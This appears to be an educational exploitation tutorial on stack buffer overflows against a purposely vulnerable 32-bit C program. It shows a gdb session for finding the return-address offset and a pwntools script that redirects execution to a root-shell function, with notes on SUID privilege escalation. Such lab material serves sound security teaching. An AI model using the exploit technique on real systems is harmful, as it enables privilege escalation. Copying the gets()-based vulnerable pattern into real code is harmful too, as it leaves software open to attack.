# Stack overflow

Stack overflow is about a buffer overflow vulnerability which purpose is not to overwrite variables after the buffer, but also to overwrite the saved return address.

## Jump to an arbitrary address

Let's try to jump to an arbitrary address of our program text section.

Consider this program:
```C
#include <unistd.h>
#include <string.h>

// gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie

// Function that sets user id to 0 and execute the shell
void shell(){
  setuid(0);
  system("/bin/sh");
}

void vuln_func(){
  char vuln_buff[250];
  // vulnerable
  gets(vuln_buff);
}

int main(int argc, char *argv[]){
  vuln_func();
  return 0;
}
```

So, here we have a vulnerable function `vuln_func` that does the same stuff from the buffer overflow section. But now we will overflow the buffer and overwrite the return address to jump to an arbitrary address of the program. This address will be the address of the beginning of the `shell` function. Thus, when we overflow the buffer and overwrite the return address after the `vuln_func` completes its execution, it will take the new return address and jump to the shell function.

To determine the offset just do next in gdb:
```bash
gef➤  r < <(python -c 'print "A"*250 + "B"*16')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "A"*250 + "B"*16')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

My offset is 12 bytes. The next 4 bytes will overwrite the return address. You can have a different offset.

Next, find the start address of `shell` function:
```bash
gef➤  disas shell
Dump of assembler code for function shell:
   0x080491d6 <+0>:	endbr32
   0x080491da <+4>:	push   ebp
   0x080491db <+5>:	mov    ebp,esp
   0x080491dd <+7>:	push   ebx
   0x080491de <+8>:	sub    esp,0x4
   0x080491e1 <+11>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x080491e6 <+16>:	add    ebx,0x2e1a
   0x080491ec <+22>:	sub    esp,0xc
   0x080491ef <+25>:	push   0x0
   0x080491f1 <+27>:	call   0x80490b0 <setuid@plt>
   0x080491f6 <+32>:	add    esp,0x10
   0x080491f9 <+35>:	sub    esp,0xc
   0x080491fc <+38>:	lea    eax,[ebx-0x1ff8]
   0x08049202 <+44>:	push   eax
   0x08049203 <+45>:	call   0x8049090 <system@plt>
   0x08049208 <+50>:	add    esp,0x10
   0x0804920b <+53>:	nop
   0x0804920c <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804920f <+57>:	leave  
   0x08049210 <+58>:	ret    
End of assembler dump.
```

`0x080491d6` is that's what you need.

Then, try to replace last 4 bytes in payload on this address:
```bash
gef➤  r < <(python -c 'print "A"*250 + "B"*12 + "\xd6\x91\x04\x08"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "A"*250 + "B"*12 + "\xd6\x91\x04\x08"')
[Detaching after vfork from child process 6753]

Program received signal SIGSEGV, Segmentation fault.
0xf7fa8000 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

Segmentation fault is nothing because you can see that the gdb shows you detaching. It means that the shell is executed.

Now, do it with `pwntools`:
```python
from pwn import *


# start the vuln program
p = process('./stack-overflow')
# shell function address
shell_addr = p32(0x080491d6)
# fill the vuln buffer
payload = b'A' * 250
# add the offset
payload += b'B' * 12
# add a new return address
payload += shell_addr
# send to process
p.sendline(payload)
# Shell
p.interactive()
```

Again, you have a shell, or if this program would be with SUID bit set, you would get the root or another user who is owned this program.
